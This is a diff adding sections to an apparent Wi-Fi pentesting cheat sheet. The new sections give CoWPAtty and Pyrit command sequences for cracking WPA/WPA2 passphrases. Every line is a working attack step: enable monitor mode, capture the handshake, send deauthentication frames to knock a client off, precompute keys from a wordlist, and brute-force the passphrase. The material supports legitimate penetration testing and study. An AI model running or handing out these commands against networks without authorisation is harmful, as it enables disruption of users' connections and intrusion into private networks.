@@ -61,3 +61,25 @@ aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
 ./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w - <capture>
 ```
 
+### CoWPAtty method
+```
+airmon-ng start <interface> <AP channel>
+airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+genpmk -f <wordlist> -d <hashes filename> -s <ESSID>
+cowpatty -r <capture> -d <hashes filename> -2 -s <ESSID>
+```
+### Pyrit method
+```
+airmon-ng start <interface> <AP channel>
+pyrit -r <interface> -o <capture> stripLive
+aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+pyrit -i <wordlist> import_passwords
+pyrit -e <ESSID> create_essid
+pyrit batch
+pyrit -r <capture> -b <AP MAC> attack_db
+```
+
+
+
+
